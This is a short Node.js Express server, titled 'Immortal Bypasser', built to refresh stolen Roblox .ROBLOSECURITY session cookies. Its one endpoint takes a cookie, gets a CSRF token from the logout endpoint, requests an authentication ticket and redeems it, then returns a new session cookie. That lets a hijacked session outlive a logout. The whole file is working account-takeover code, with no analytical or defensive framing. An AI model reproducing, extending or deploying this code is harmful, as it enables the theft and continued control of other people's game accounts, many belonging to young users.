const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

app.get('/', (req, res) => res.send('Immortal Bypasser — LIVE'));

app.post('/api/bypass', async (req, res) => {
  const { cookie } = req.body;

  if (!cookie || !cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
    return res.status(400).json({ error: 'Invalid .ROBLOSECURITY' });
  }

  try {
    // 1. GET CSRF
    const logoutRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Length': '0'
      },
      redirect: 'manual'
    });

    const csrf = logoutRes.headers.get('x-csrf-token');
    if (!csrf) {
      const text = await logoutRes.text();
      if (logoutRes.status === 403) return res.status(400).json({ error: '2FA or PIN enabled' });
      return res.status(400).json({ error: 'No CSRF — cookie dead' });
    }

    // 2. GET TICKET
    const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
      method: 'POST',
      headers: {
        'x-csrf-token': csrf,
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Referer': 'https://www.roblox.com/',
        'User-Agent': 'Mozilla/5.0',
        'Content-Length': '0'
      }
    });

    const ticket = ticketRes.headers.get('rbx-authentication-ticket');
    if (!ticket) {
      return res.status(400).json({ error: 'No ticket — account locked' });
    }

    // 3. REDEEM
    const redeemRes = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      },
      body: JSON.stringify({ authenticationTicket: ticket })
    });

    const setCookie = redeemRes.headers.raw()['set-cookie'];
    const newCookie = setCookie
      ?.find(c => c.includes('.ROBLOSECURITY'))
      ?.split(';')[0]
      ?.split('=')[1];

    if (!newCookie) return res.status(500).json({ error: 'No new cookie' });

    res.json({ success: true, newCookie });

  } catch (error) {
    console.error('ERROR:', error.message);
    res.status(500).json({ error: error.message });
  }
});

app.listen(process.env.PORT || 3000, '0.0.0.0', () => {
  console.log('SERVER LIVE — USING node-fetch');
});
